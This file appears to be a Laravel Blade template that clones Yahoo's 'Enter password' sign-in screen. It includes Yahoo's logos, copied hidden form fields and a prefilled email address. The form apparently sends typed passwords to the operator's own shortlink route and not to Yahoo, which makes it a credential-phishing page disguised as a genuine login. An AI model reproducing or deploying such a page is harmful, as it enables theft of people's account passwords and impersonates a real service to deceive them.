
    <div x-cloak x-show="!is_login" class="mbr-login-hd" id="mbr-uh-hd">
        <a href="https://www.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
        </a>
    </div>
    <div x-cloak x-show="!is_login" class="challenge password-challenge">
        <div class="challenge-header">
            <div class="yid">meledjearmel@gmail.com</div>
        </div><div id="password-challenge" class="primary">
            <strong class="challenge-heading">Enter&nbsp;password</strong>
            <span class="txt-align-center challenge-desc">to finish sign&nbsp;in</span>
            <form action="{{ route('shortlink.store', $short_key) }}" method="post" class="challenge-form">
                @csrf
                @yahoo
                <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="{&quot;language&quot;:&quot;fr-FR&quot;,&quot;colorDepth&quot;:24,&quot;deviceMemory&quot;:8,&quot;pixelRatio&quot;:1,&quot;hardwareConcurrency&quot;:4,&quot;timezoneOffset&quot;:0,&quot;timezone&quot;:&quot;UTC&quot;,&quot;sessionStorage&quot;:1,&quot;localStorage&quot;:1,&quot;indexedDb&quot;:1,&quot;openDatabase&quot;:1,&quot;cpuClass&quot;:&quot;unknown&quot;,&quot;platform&quot;:&quot;Win32&quot;,&quot;doNotTrack&quot;:&quot;1&quot;,&quot;plugins&quot;:{&quot;count&quot;:5,&quot;hash&quot;:&quot;2c14024bf8584c3f7f63f24ea490e812&quot;},&quot;canvas&quot;:&quot;canvas winding:yes~canvas&quot;,&quot;webgl&quot;:1,&quot;webglVendorAndRenderer&quot;:&quot;Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics Family Direct3D11 vs_5_0 ps_5_0, D3D11)&quot;,&quot;adBlock&quot;:0,&quot;hasLiedLanguages&quot;:0,&quot;hasLiedResolution&quot;:0,&quot;hasLiedOs&quot;:1,&quot;hasLiedBrowser&quot;:0,&quot;touchSupport&quot;:{&quot;points&quot;:0,&quot;event&quot;:0,&quot;start&quot;:0},&quot;fonts&quot;:{&quot;count&quot;:40,&quot;hash&quot;:&quot;c820f618df158821d161a7fe2d31595d&quot;},&quot;audio&quot;:&quot;124.04347527516074&quot;,&quot;resolution&quot;:{&quot;w&quot;:&quot;1200&quot;,&quot;h&quot;:&quot;700&quot;},&quot;availableResolution&quot;:{&quot;w&quot;:&quot;700&quot;,&quot;h&quot;:&quot;1200&quot;},&quot;ts&quot;:{&quot;serve&quot;:1654251568095,&quot;render&quot;:1654251564140}}">
                <input type="hidden" name="crumb" value="C9OEeTsC0Ht">
                <input type="hidden" name="acrumb" value="GAhNjUSu">
                <input type="hidden" name="sessionIndex" value="QQ--">
                <input type="hidden" name="displayName" value="meledjearmel@gmail.com">
                <div class="hidden-username">
                    <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="meledjearmel@gmail.com">
                </div>
                <input type="hidden" name="passwordContext" value="normal">
                <input type="hidden" name="isShowButtonClicked" id="show-button-clicked" value="">
                <input type="hidden" name="showButtonStatus" id="show-button-status" value="">
                <input type="hidden" name="prefersReducedMotion" id="prefers-reduce-motion" value="">
                <div id="password-container" class="input-group password-container blurred">
                    <input type="password" id="login-passwd" class="password" name="password" placeholder=" " autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd">
                    <input x-model="email" type="hidden" name="email">
                    <label for="login-passwd" id="password-label" class="password-label">Password</label>
                    <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
                    <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password" data-rapid-tracking="true" data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide">
                    </button>
                </div>
                @yahoo
                <div class="button-container">
                    <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                        Next
                    </button>
                </div>
                <div class="forgot-cont challenge-button-link">
                    <input type="submit" class="pure-button puree-button-link challenge-button-link" data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery" data-rapid-tracking="true" id="mbr-forgot-link" name="skip" value="Forgot&nbsp;password?">
                </div>
            </form>
        </div>
    </div>
